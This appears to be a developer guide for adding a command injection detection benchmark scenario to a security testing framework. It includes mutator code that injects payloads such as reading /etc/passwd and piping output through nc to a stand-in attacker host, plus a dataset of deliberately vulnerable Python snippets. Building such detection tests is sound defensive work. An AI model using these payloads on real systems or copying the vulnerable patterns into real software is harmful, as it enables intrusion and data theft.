# Integration Guide: Adding New Scenarios

**Version:** 1.0
**Date:** November 2025
**Status:** Design Phase

---

## Complete Walkthrough: Command Injection Scenario

This guide shows **step-by-step** how to add a new security scenario to the framework using **Command Injection** as an example.

**Time to complete:** ~4-6 hours for a simple scenario

---

## Prerequisites

✅ Framework installed
✅ Understanding of the attack type
✅ Test dataset available (or create one)
✅ Python 3.11+ environment

---

## Step 1: Directory Structure (5 minutes)

Create the scenario directory:

```bash
mkdir -p scenarios/command_injection
cd scenarios/command_injection

# Create files
touch __init__.py
touch scenario.py
touch mutators.py
touch validators.py
touch README.md

# Create dataset directory
mkdir -p ../../datasets/command_injection
```

Your structure should look like:

```
scenarios/command_injection/
├── __init__.py
├── scenario.py          # Main scenario class
├── mutators.py          # Attack mutations
├── validators.py        # Attack validation
└── README.md            # Documentation

datasets/command_injection/
└── test_cases.json      # Test dataset
```

---

## Step 2: Define the Scenario Class (30 minutes)

**File:** `scenarios/command_injection/scenario.py`

```python
"""Command Injection Detection Scenario."""

from typing import List, Dict
from pathlib import Path

from framework.base import SecurityScenario, Mutator, Validator, Attack, DetectionScore
from framework.models import DetectionOutcome
from .mutators import (
    ShellMetacharacterMutator,
    CommandChainingMutator,
    EncodingMutator,
    WhitespaceObfuscationMutator
)
from .validators import (
    SyntaxValidator,
    SemanticValidator,
    GroundTruthValidator,
    ScenarioValidator
)


class CommandInjectionScenario(SecurityScenario):
    """
    Security scenario for testing command injection detection.

    Techniques:
    - classic_command: Basic command injection
    - blind_command: Blind command injection
    - code_injection: Code injection via eval/exec
    """

    def __init__(self):
        self.name = "command_injection"
        self.techniques = [
            "classic_command",
            "blind_command",
            "code_injection"
        ]

        # Technique hierarchy
        self.sub_techniques = {
            "classic_command": ["shell_metachar", "command_substitution"],
            "blind_command": ["time_based", "out_of_band"],
            "code_injection": ["eval_injection", "exec_injection"]
        }

    def get_name(self) -> str:
        return self.name

    def get_techniques(self) -> List[str]:
        return self.techniques

    def get_sub_techniques(self, technique: str) -> List[str]:
        return self.sub_techniques.get(technique, [])

    def get_mutators(self) -> List[Mutator]:
        """Return command injection specific mutators."""
        return [
            ShellMetacharacterMutator(),
            CommandChainingMutator(),
            EncodingMutator(),
            WhitespaceObfuscationMutator()
        ]

    def get_validators(self) -> Dict[str, Validator]:
        """Return validators for command injection attacks."""
        return {
            "syntax": SyntaxValidator(),
            "semantic": SemanticValidator(),
            "ground_truth": GroundTruthValidator(),
            "scenario": ScenarioValidator()
        }

    def validate_attack(self, attack: Attack) -> bool:
        """
        Scenario-specific validation.

        Checks:
        - Attack uses shell commands
        - Payload is realistic
        - Fits command injection threat model
        """
        # Check if code contains shell command execution
        shell_keywords = ["os.system", "subprocess", "exec", "eval", "$", "`"]
        return any(keyword in attack.code for keyword in shell_keywords)

    def score_detection(
        self,
        ground_truth: bool,
        prediction: bool,
        confidence: float
    ) -> DetectionScore:
        """Score Purple Agent's detection."""

        if ground_truth and prediction:
            outcome = DetectionOutcome.TRUE_POSITIVE
        elif not ground_truth and not prediction:
            outcome = DetectionOutcome.TRUE_NEGATIVE
        elif not ground_truth and prediction:
            outcome = DetectionOutcome.FALSE_POSITIVE
        else:  # ground_truth and not prediction
            outcome = DetectionOutcome.FALSE_NEGATIVE

        return DetectionScore(
            outcome=outcome,
            confidence=confidence,
            ground_truth=ground_truth,
            prediction=prediction
        )

    def load_dataset(self, dataset_path: str) -> List[Attack]:
        """Load command injection test cases."""
        import json

        path = Path(dataset_path)
        with open(path, 'r') as f:
            data = json.load(f)

        attacks = []
        for item in data:
            attack = Attack(
                id=item["id"],
                code=item["code"],
                language=item.get("language", "python"),
                technique=item["category"],
                ground_truth=item["is_vulnerable"],
                metadata=item.get("metadata", {})
            )
            attacks.append(attack)

        return attacks
```

---

## Step 3: Implement Mutators (1-2 hours)

**File:** `scenarios/command_injection/mutators.py`

```python
"""Mutators for command injection attacks."""

import re
import random
from framework.base import Mutator, Attack


class ShellMetacharacterMutator(Mutator):
    """
    Mutates command injection to use shell metacharacters.

    Example:
        Original: os.system("ping " + host)
        Mutated:  os.system("ping ; cat /etc/passwd #" + host)
    """

    def mutate(self, attack: Attack) -> Attack:
        code = attack.code

        # Find command execution patterns
        patterns = [
            (r'os\.system\("([^"]+)"\)', self._inject_metachar),
            (r'subprocess\.call\(\["([^"]+)"\]\)', self._inject_array_metachar),
        ]

        for pattern, mutation_func in patterns:
            code = re.sub(pattern, mutation_func, code)

        return attack.copy(update={
            "code": code,
            "generation": attack.generation + 1,
            "parent_ids": attack.parent_ids + [attack.id],
            "metadata": {**attack.metadata, "mutator": "shell_metachar"}
        })

    def _inject_metachar(self, match):
        original = match.group(1)
        metachars = ["; cat /etc/passwd #", "| nc attacker.com 4444", "& whoami"]
        injection = random.choice(metachars)
        return f'os.system("{original}{injection}")'

    def _inject_array_metachar(self, match):
        original = match.group(1)
        return f'subprocess.call(["{original}; whoami"])'

    def get_mutation_type(self) -> str:
        return "shell_metacharacter"

    @property
    def mutation_rate(self) -> float:
        return 0.4  # Apply to 40% of attacks


class CommandChainingMutator(Mutator):
    """
    Mutates to use command chaining (&&, ||, ;).

    Example:
        Original: subprocess.run(["ping", host])
        Mutated:  subprocess.run(["ping", host + " && cat /etc/passwd"])
    """

    def mutate(self, attack: Attack) -> Attack:
        code = attack.code

        # Inject command chaining
        chain_operators = ["&&", "||", ";"]
        commands = ["cat /etc/passwd", "whoami", "id", "uname -a"]

        operator = random.choice(chain_operators)
        command = random.choice(commands)

        # Simple string replacement (improve for production)
        if '+ ' in code:
            code = code.replace('+ ', f' + " {operator} {command}" + ')

        return attack.copy(update={
            "code": code,
            "generation": attack.generation + 1,
            "metadata": {**attack.metadata, "mutator": "command_chaining"}
        })

    def get_mutation_type(self) -> str:
        return "command_chaining"

    @property
    def mutation_rate(self) -> float:
        return 0.3


class EncodingMutator(Mutator):
    """
    Applies encoding transformations.

    Example:
        Original: os.system("ls")
        Mutated:  os.system("\\x6c\\x73")  # hex encoding
    """

    def mutate(self, attack: Attack) -> Attack:
        code = attack.code

        # Find string literals to encode
        def hex_encode(match):
            original = match.group(1)
            encoded = ''.join(f'\\x{ord(c):02x}' for c in original)
            return f'"{encoded}"'

        code = re.sub(r'"([^"]+)"', hex_encode, code)

        return attack.copy(update={
            "code": code,
            "generation": attack.generation + 1,
            "metadata": {**attack.metadata, "mutator": "encoding"}
        })

    def get_mutation_type(self) -> str:
        return "encoding"

    @property
    def mutation_rate(self) -> float:
        return 0.2


class WhitespaceObfuscationMutator(Mutator):
    """
    Obfuscates using whitespace and comments.

    Example:
        Original: os.system("ls")
        Mutated:  os . system ( "ls" )
    """

    def mutate(self, attack: Attack) -> Attack:
        code = attack.code

        # Add random whitespace
        code = re.sub(r'\.', ' . ', code)
        code = re.sub(r'\(', ' ( ', code)
        code = re.sub(r'\)', ' ) ', code)

        return attack.copy(update={
            "code": code,
            "generation": attack.generation + 1,
            "metadata": {**attack.metadata, "mutator": "whitespace_obfuscation"}
        })

    def get_mutation_type(self) -> str:
        return "whitespace_obfuscation"

    @property
    def mutation_rate(self) -> float:
        return 0.1
```

---

## Step 4: Implement Validators (1-2 hours)

**File:** `scenarios/command_injection/validators.py`

```python
"""Validators for command injection attacks."""

import ast
import re
from framework.base import Validator, Attack, ValidationResult


class SyntaxValidator(Validator):
    """Validates that Python code is syntactically valid."""

    def validate(self, attack: Attack) -> ValidationResult:
        try:
            ast.parse(attack.code)
            is_valid = True
            reason = None
        except SyntaxError as e:
            is_valid = False
            reason = f"Syntax error: {e}"

        return ValidationResult(
            is_valid=is_valid,
            validation_details=[("syntax", is_valid)],
            attack=attack,
            rejection_reason=reason
        )

    def get_validator_type(self) -> str:
        return "syntax"


class SemanticValidator(Validator):
    """Validates semantic realism of command injection."""

    def validate(self, attack: Attack) -> ValidationResult:
        code = attack.code

        # Check 1: Has command execution
        has_execution = any(keyword in code for keyword in [
            "os.system", "subprocess", "exec", "eval"
        ])

        # Check 2: Has user input (variable concatenation/formatting)
        has_user_input = any(pattern in code for pattern in [
            "+", "f\"", "format(", "%s"
        ])

        # Check 3: Not obviously sanitized
        has_sanitization = any(keyword in code.lower() for keyword in [
            "shlex.quote", "escape", "sanitize"
        ])

        is_valid = has_execution and has_user_input and not has_sanitization

        return ValidationResult(
            is_valid=is_valid,
            validation_details=[("semantic", is_valid)],
            attack=attack,
            rejection_reason=None if is_valid else "Not semantically realistic"
        )

    def get_validator_type(self) -> str:
        return "semantic"


class GroundTruthValidator(Validator):
    """Validates ground truth label is correct."""

    def validate(self, attack: Attack) -> ValidationResult:
        # Heuristic check
        vulnerable_patterns = [
            r'os\.system\(.+\+.+\)',      # String concatenation
            r'subprocess\.\w+\(.+\+.+\)',  # Subprocess with concatenation
            r'eval\(',                     # eval is almost always vulnerable
            r'exec\(',                     # exec is almost always vulnerable
        ]

        has_vulnerability = any(
            re.search(pattern, attack.code)
            for pattern in vulnerable_patterns
        )

        # Ground truth should match heuristic
        label_correct = has_vulnerability == attack.ground_truth

        return ValidationResult(
            is_valid=label_correct,
            validation_details=[("ground_truth", label_correct)],
            attack=attack,
            rejection_reason=None if label_correct else "Ground truth mismatch"
        )

    def get_validator_type(self) -> str:
        return "ground_truth"


class ScenarioValidator(Validator):
    """Validates attack fits command injection scenario."""

    def validate(self, attack: Attack) -> ValidationResult:
        code = attack.code

        # Check technique matches code
        technique = attack.technique

        if technique == "classic_command":
            # Should have direct command execution
            is_valid = any(kw in code for kw in ["os.system", "subprocess.call"])

        elif technique == "blind_command":
            # Should have time delay or out-of-band
            is_valid = "sleep" in code.lower() or "timeout" in code.lower()

        elif technique == "code_injection":
            # Should have eval/exec
            is_valid = "eval(" in code or "exec(" in code

        else:
            is_valid = False

        return ValidationResult(
            is_valid=is_valid,
            validation_details=[("scenario", is_valid)],
            attack=attack,
            rejection_reason=None if is_valid else f"Doesn't match technique: {technique}"
        )

    def get_validator_type(self) -> str:
        return "scenario"
```

---

## Step 5: Create Dataset (1-2 hours)

**File:** `datasets/command_injection/test_cases.json`

```json
[
    {
        "id": "cmd_001",
        "code": "import os\nhost = input(\"Host: \")\nos.system(\"ping \" + host)",
        "language": "python",
        "category": "classic_command",
        "is_vulnerable": true,
        "metadata": {
            "description": "Basic command injection via string concatenation",
            "severity": "critical"
        }
    },
    {
        "id": "cmd_002",
        "code": "import subprocess\nfile = request.GET.get('file')\nsubprocess.call(['cat', file])",
        "language": "python",
        "category": "classic_command",
        "is_vulnerable": false,
        "metadata": {
            "description": "Safe - uses array form of subprocess",
            "severity": "none"
        }
    },
    {
        "id": "cmd_003",
        "code": "import os\ncmd = user_input\nos.system(cmd + \" && cat /etc/passwd\")",
        "language": "python",
        "category": "classic_command",
        "is_vulnerable": true,
        "metadata": {
            "description": "Command chaining injection",
            "severity": "critical"
        }
    },
    {
        "id": "cmd_004",
        "code": "import subprocess\nimport shlex\nuser_cmd = shlex.quote(user_input)\nsubprocess.run(f\"ping {user_cmd}\", shell=True)",
        "language": "python",
        "category": "classic_command",
        "is_vulnerable": false,
        "metadata": {
            "description": "Safe - uses shlex.quote for sanitization",
            "severity": "none"
        }
    },
    {
        "id": "cmd_005",
        "code": "eval(user_code)",
        "language": "python",
        "category": "code_injection",
        "is_vulnerable": true,
        "metadata": {
            "description": "Direct code injection via eval",
            "severity": "critical"
        }
    }
]
```

*Add 20-50 more test cases for comprehensive coverage*

---

## Step 6: Register Scenario (5 minutes)

**File:** `framework/registry.py` (create if doesn't exist)

```python
"""Scenario registry."""

from typing import Dict, Type
from framework.base import SecurityScenario

# Import scenarios
from scenarios.sql_injection.scenario import SQLInjectionScenario
from scenarios.command_injection.scenario import CommandInjectionScenario  # NEW


SCENARIO_REGISTRY: Dict[str, Type[SecurityScenario]] = {
    "sql_injection": SQLInjectionScenario,
    "command_injection": CommandInjectionScenario,  # NEW
}


def get_scenario(name: str) -> SecurityScenario:
    """Get scenario instance by name."""
    if name not in SCENARIO_REGISTRY:
        raise ValueError(f"Unknown scenario: {name}. Available: {list(SCENARIO_REGISTRY.keys())}")

    scenario_class = SCENARIO_REGISTRY[name]
    return scenario_class()


def list_scenarios() -> list[str]:
    """List all registered scenarios."""
    return list(SCENARIO_REGISTRY.keys())
```

---

## Step 7: Test the Scenario (30 minutes)

**File:** `tests/test_command_injection_scenario.py`

```python
"""Tests for command injection scenario."""

import pytest
from pathlib import Path

from scenarios.command_injection.scenario import CommandInjectionScenario
from framework.models import Attack


class TestCommandInjectionScenario:
    @pytest.fixture
    def scenario(self):
        return CommandInjectionScenario()

    def test_get_techniques(self, scenario):
        techniques = scenario.get_techniques()
        assert "classic_command" in techniques
        assert "blind_command" in techniques
        assert "code_injection" in techniques

    def test_get_mutators(self, scenario):
        mutators = scenario.get_mutators()
        assert len(mutators) == 4
        assert any(m.get_mutation_type() == "shell_metacharacter" for m in mutators)

    def test_get_validators(self, scenario):
        validators = scenario.get_validators()
        assert "syntax" in validators
        assert "semantic" in validators
        assert "ground_truth" in validators
        assert "scenario" in validators

    def test_validate_attack_valid(self, scenario):
        attack = Attack(
            id="test_001",
            code='os.system("ping " + host)',
            language="python",
            technique="classic_command",
            ground_truth=True
        )
        assert scenario.validate_attack(attack) is True

    def test_validate_attack_invalid(self, scenario):
        attack = Attack(
            id="test_002",
            code='print("Hello")',  # No shell commands
            language="python",
            technique="classic_command",
            ground_truth=False
        )
        assert scenario.validate_attack(attack) is False

    def test_score_detection_true_positive(self, scenario):
        score = scenario.score_detection(
            ground_truth=True,
            prediction=True,
            confidence=0.9
        )
        assert score.outcome == "TP"

    def test_load_dataset(self, scenario):
        dataset_path = "datasets/command_injection/test_cases.json"
        if Path(dataset_path).exists():
            attacks = scenario.load_dataset(dataset_path)
            assert len(attacks) > 0
            assert all(isinstance(a, Attack) for a in attacks)


class TestCommandInjectionMutators:
    def test_shell_metachar_mutator(self):
        from scenarios.command_injection.mutators import ShellMetacharacterMutator

        mutator = ShellMetacharacterMutator()
        attack = Attack(
            id="test",
            code='os.system("ping " + host)',
            language="python",
            technique="classic_command",
            ground_truth=True
        )

        mutated = mutator.mutate(attack)
        assert mutated.generation == 1
        assert "test" in mutated.parent_ids


# Run tests
if __name__ == "__main__":
    pytest.main([__file__, "-v"])
```

Run tests:
```bash
pytest tests/test_command_injection_scenario.py -v
```

---

## Step 8: Run Evaluation (10 minutes)

```python
"""Example: Run command injection evaluation."""

import asyncio
from framework.registry import get_scenario
from framework.orchestrator import MasterOrchestrator
from framework.models import EvaluationConfig, EvaluationMode

async def main():
    # Get scenario
    scenario = get_scenario("command_injection")

    # Create orchestrator
    orchestrator = MasterOrchestrator(
        scenario=scenario,
        enable_red_team=True,
        enable_blue_team=True,
        enable_judge_panel=True
    )

    # Configure evaluation
    config = EvaluationConfig(
        mode=EvaluationMode.ADAPTIVE,
        test_budget=50,
        timeout_seconds=300,
        enable_red_team=True,
        red_team_budget_percentage=0.5,
        enable_blue_team=True,
        enable_judge_panel=False  # Disable if no LLM API key
    )

    # Run evaluation (replace with actual purple agent)
    # results = await orchestrator.evaluate(purple_agent, config)
    # print(results)

if __name__ == "__main__":
    asyncio.run(main())
```

---

## Checklist: Scenario Complete ✓

- [x] Directory structure created
- [x] Scenario class implemented
- [x] Mutators implemented (4+)
- [x] Validators implemented (4)
- [x] Dataset created (20+ test cases)
- [x] Registered in framework
- [x] Tests written
- [x] Tests passing
- [x] README documentation
- [x] Can run evaluation

---

## Tips & Best Practices

### Mutators

✅ **DO:**
- Create diverse mutation types
- Test mutators independently
- Document what each mutator does
- Keep mutations realistic

❌ **DON'T:**
- Create overly contrived mutations
- Break code syntax
- Make detection trivial

### Validators

✅ **DO:**
- Validate multiple dimensions
- Fail fast (syntax first)
- Provide clear rejection reasons
- Log validation statistics

❌ **DON'T:**
- Accept unrealistic attacks
- Skip ground truth validation
- Allow contradictory labels

### Datasets

✅ **DO:**
- Include diverse examples
- Balance vulnerable/safe (50/50)
- Cover all techniques
- Add metadata

❌ **DON'T:**
- Use only simple examples
- Heavily bias one class
- Forget edge cases

---

## Next Steps

1. **Validate with Purple Agent:** Test your scenario against real security tool
2. **Tune Mutators:** Adjust mutation rates based on validation statistics
3. **Expand Dataset:** Add more test cases as you discover gaps
4. **Document:** Update README with examples and findings

---

**Previous:** [EVOLUTION.md](EVOLUTION.md) - Framework evolution
**Related:** [SPECIFICATION.md](SPECIFICATION.md) - Technical specifications
